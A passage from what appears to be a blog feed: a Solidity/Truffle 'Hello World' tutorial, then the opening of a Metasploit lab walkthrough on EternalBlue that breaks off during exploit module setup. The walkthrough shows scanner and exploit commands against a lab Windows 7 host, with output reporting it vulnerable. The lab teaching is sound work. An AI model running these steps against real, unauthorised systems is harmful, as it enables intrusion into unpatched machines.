    <content type="html"><![CDATA[<p>参考 <a href="https://learnblockchain.cn/docs/solidity/index.html" target="_blank" rel="noopener">Solidity 0.5.9 中文文档</a>。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Ubuntu 16.04.6</li></ul><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>Solidity 是一种智能合约的高级语言，运行在 Ethereum 虚拟机（EVM）之上。它的语法接近于 JavaScript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些：</p><ul><li>以太坊底层是基于账户，而非 <a href="https://me.tryblockchain.org/Solidity%e7%9a%84%e5%9c%b0%e5%9d%80%e7%b1%bb%e5%9e%8b.html" target="_blank" rel="noopener">UTXO</a> 的，所以有一个特殊的 Address 的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个账户）。</li><li>由于语言内嵌框架是支持支付的，所以提供了一些关键字，如 <a href="https://me.tryblockchain.org/%e6%94%af%e4%bb%98%e7%9b%b8%e5%85%b3.html" target="_blank" rel="noopener">payable</a>，可以在语言层面直接支持支付，而且超级简单。</li><li>存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。</li><li>运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。</li><li>最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。</li></ul><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>下面尝试编写 Solidity 下的 Hello World。</p><p>第一步是安装 nodejs 和 npm，然后才能安装 truffle：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install npm nodejs nodejs-legacy</span><br><span class="line">sudo npm install npm -g</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n stable <span class="comment"># 下载稳定版 node</span></span><br><span class="line">sudo npm install -g truffle truffle-contract web3 --unsafe-perm=<span class="literal">true</span> --allow-root</span><br></pre></td></tr></table></figure><p>安装完 truffle 后，下载 <a href="https://github.com/trufflesuite/ganache/releases/download/v2.1.1/ganache-2.1.1-linux-x86_64.AppImage" target="_blank" rel="noopener">Ganache</a> 以方便搭建本地区块链环境（Ganache 在内存中模拟了一个区块链，因此每次 Ganache 关闭之后，区块链会丢失）。下载完后双击打开软件并启动本地环境。</p><p>各部分都成功安装之后，新建一个目录，并在目录下运行 <code>truffle init</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle init</span><br><span class="line"></span><br><span class="line">✔ Preparing to download</span><br><span class="line">✔ Downloading</span><br><span class="line">✔ Cleaning up temporary files</span><br><span class="line">✔ Setting up box</span><br><span class="line"></span><br><span class="line">Unbox successful. Sweet!</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line"></span><br><span class="line">  Compile:        truffle compile</span><br><span class="line">  Migrate:        truffle migrate</span><br><span class="line">  Test contracts: truffle test</span><br></pre></td></tr></table></figure><p>简单说明一下生成的几个文件：</p><ul><li><code>/contracts</code>：存放智能合约原始代码的地方。</li><li><code>/migrations</code>：这是 Truffle 用来部署智能合约的功能。</li><li><code>/test</code>：测试智能合约的代码放在这里，支持 <code>js</code> 与 <code>sol</code> 测试。</li><li><code>truffle-config.js</code>：Truffle 的设置文档。</li></ul><p>Solidity 中合约的含义就是一组代码（函数）和数据（状态），它们位于以太坊区块链的一个特定地址上。关键字 <code>pragma</code> 告知编译器源代码所适用的 Solidity 版本为 &gt;=0.4.0 及 &lt;0.7.0，为了确保合约不会在新的编译器版本中突然行为异常。</p><p>关键字 <code>contract</code> 即为指定合约，关键字 <code>function</code> 指定函数。<code>public</code> 指定函数的公开权限，<code>view</code> 用来标识那些不改变存储状态的方法（相比之下而 <code>pure</code> 更加严格，它修饰的方法不但不改变存贮状态，也不读取存储的变量值），<code>returns</code> 指定返回值的数据类型。</p><blockquote><p>注意：所有的标识符（合约名称，函数名称和变量名称）都只能使用 ASCII 字符集。UTF-8 编码的数据可以用字符串变量的形式存储；小心使用 Unicode 文本，因为有些字符虽然长得相像（甚至一样），但其字符码是不同的，其编码后的字符数组也会不一样。</p></blockquote><p>以下为一个简单的返回 <code>Hello World</code> 的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">function sayHello() public view returns (string memory) &#123;</span><br><span class="line">return &quot;Hello World&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输入 <code>truffle compile</code> 进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle compile</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Compiling ./contracts/HelloWorld.sol</span><br><span class="line">&gt; Compiling ./contracts/Migrations.sol</span><br><span class="line"></span><br><span class="line">    &gt; compilation warnings encountered:</span><br><span class="line"></span><br><span class="line">/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  <span class="keyword">function</span> sayHello() public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant <span class="built_in">source</span> part starts here and spans across multiple lines).</span><br><span class="line"></span><br><span class="line">&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts</span><br><span class="line">&gt; Compiled successfully using:</span><br><span class="line">   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</span><br></pre></td></tr></table></figure><p>接下来我们需要在 <code>migrations</code> 下添加一个部署文件 <code>2_deploy_contracts.js</code>，用来待会儿对 <code>HelloWorld.sol</code> 的部署。部署文件的文件名要求以数字为前缀，后缀为描述。编号前缀是必需的，以便记录迁移是否成功运行，后缀纯粹是为了方便理解。</p><blockquote><p>注意：编号还有记录运行迁移文件顺序的作用。</p></blockquote><p>使用 <code>artifacts.require</code> 语句来取得准备部署的合约。使用 <code>deployer.deploy</code> 语句将合约部署到区块链上。这边 HelloWorld 是 contract 的名称而不是文件名。因此可以用此语法读入任一 <code>.sol</code> 文件中的任一合约。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HelloWorld = artifacts.require(<span class="string">"HelloWorld"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(HelloWorld);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在确保之前的 <code>Ganache</code> 已经启动并生成了十个账户后，输入 <code>truffle migrate</code> 将合约部署到 <code>Ganache</code> 上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle migrate</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    &apos;ganache&apos;</span><br><span class="line">&gt; Network id:      5777</span><br><span class="line">&gt; Block gas limit: 0x6691b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying &apos;Migrations&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0xc3b75999936e57ba192b2053a581762c1f235aad3090caea5572c3deb1d98802</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x55a333d4f932a737E0b97af4E3F8F4E971600D43</span><br><span class="line">   &gt; block number:        5</span><br><span class="line">   &gt; block timestamp:     1569581737</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.98561934</span><br><span class="line">   &gt; gas used:            261393</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Deploying &apos;HelloWorld&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x9c05c079cbdbb90a3d53fdf5e66e3a79fce1a0e5f633815068c9a82aaaf912b0</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x4752C4f381D9e492e10daCCf9213d916bd1f8caF</span><br><span class="line">   &gt; block number:        7</span><br><span class="line">   &gt; block timestamp:     1569581739</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.98223486</span><br><span class="line">   &gt; gas used:            127201</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00254402 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00254402 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.00777188 ETH</span><br></pre></td></tr></table></figure><p>最后执行 <code>truffle console</code>，可以使用 <code>js</code> 与刚才部署的合约进行交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">truffle(ganache)&gt; let x = await HelloWorld.deployed()</span><br><span class="line">undefined</span><br><span class="line">truffle(ganache)&gt; x.sayHello()</span><br><span class="line">&apos;Hello World&apos;</span><br></pre></td></tr></table></figure><p>我们还可以尝试添加一个函数 <code>echo</code>，可以输出我们传入的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">function sayHello() public view returns (string memory) &#123;</span><br><span class="line">return &quot;Hello World&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function echo(string memory name) public view returns (string memory) &#123;</span><br><span class="line">return name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要重新编译 Truffle 项目里的合约，请切换到项目工程所在根目录。后续运行中，Truffle 将仅编译自上次编译以来有更改的合约，如果想覆盖可以使用 <code>--all</code> 选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle compile</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Compiling ./contracts/HelloWorld.sol</span><br><span class="line"></span><br><span class="line">    &gt; compilation warnings encountered:</span><br><span class="line"></span><br><span class="line">/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  function sayHello() public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant source part starts here and spans across multiple lines).</span><br><span class="line">,/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:8:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  function echo(string memory name) public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant source part starts here and spans across multiple lines).</span><br><span class="line"></span><br><span class="line">&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts</span><br><span class="line">&gt; Compiled successfully using:</span><br><span class="line">   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</span><br></pre></td></tr></table></figure><p>部署时需要加上 <code>--reset</code> 参数进行重新部署。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle migrate --reset</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    &apos;ganache&apos;</span><br><span class="line">&gt; Network id:      5777</span><br><span class="line">&gt; Block gas limit: 0x6691b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Replacing &apos;Migrations&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x73d288f20ed2d68fe565fb01e8a15ba1a591c0cfd642028b45056fc057c194e6</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x48245c079FA8558a35629BC9b8A94b00c91eD9A9</span><br><span class="line">   &gt; block number:        9</span><br><span class="line">   &gt; block timestamp:     1569581861</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.97646654</span><br><span class="line">   &gt; gas used:            261393</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Replacing &apos;HelloWorld&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x8a7ca29c50f2e2f5645a9b4c33e5ca0eb6ab50def348c2ebcfe2f6fd38d9851e</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x0d12C183e366AE74393346ae33d4b662bfB5492F</span><br><span class="line">   &gt; block number:        11</span><br><span class="line">   &gt; block timestamp:     1569581862</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.97130642</span><br><span class="line">   &gt; gas used:            215983</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00431966 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00431966 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.00954752 ETH</span><br></pre></td></tr></table></figure><p>最后进行交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">truffle(ganache)&gt; let x = await HelloWorld.deployed()</span><br><span class="line">undefined</span><br><span class="line">truffle(ganache)&gt; x.sayHello()</span><br><span class="line">&apos;Hello World&apos;</span><br><span class="line">truffle(ganache)&gt; x.echo(&apos;This is assassinq.&apos;)</span><br><span class="line">&apos;This is assassinq.&apos;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/liyuechun520/article/details/78036363" target="_blank" rel="noopener">https://blog.csdn.net/liyuechun520/article/details/78036363</a><br><a href="https://blog.csdn.net/weixin_42595515" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42595515</a><br><a href="https://www.jianshu.com/p/983122b8243e" target="_blank" rel="noopener">https://www.jianshu.com/p/983122b8243e</a><br><a href="http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 &lt;a href=&quot;https://learnblockchain.cn/docs/solidity/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Solidity 0.5.9 中文文档&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="blockchain" scheme="https://qianfei11.github.io/tags/blockchain/"/>
    
      <category term="sol" scheme="https://qianfei11.github.io/tags/sol/"/>
    
  </entry>
  
  <entry>
    <title>Have Fun with Metasploit-Framework</title>
    <link href="https://qianfei11.github.io/2019/09/16/Have-Fun-with-Metasploit-Framework/"/>
    <id>https://qianfei11.github.io/2019/09/16/Have-Fun-with-Metasploit-Framework/</id>
    <published>2019-09-16T08:51:20.000Z</published>
    <updated>2019-09-24T08:42:29.858Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。</p><a id="more"></a><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit-Framework"></a>Metasploit-Framework</h1><p>Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。</p><p>在本实验中使用 Kali Linux 下的 Metasploit Framework。</p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>VMware Fusion：专业版 11.1.0</li><li>LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109）</li><li>RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102）</li></ul><h1 id="EternalBlue"><a href="#EternalBlue" class="headerlink" title="EternalBlue"></a>EternalBlue</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="noopener">永恒之蓝</a>是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 <strong>445/TCP</strong> 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。</p><p>下面通过 Metasploit Framework 对 EternalBlue 进行利用。</p><h2 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块对靶机进行扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS       192.168.1.102                                                   yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                                      no        The password for the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.102:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span 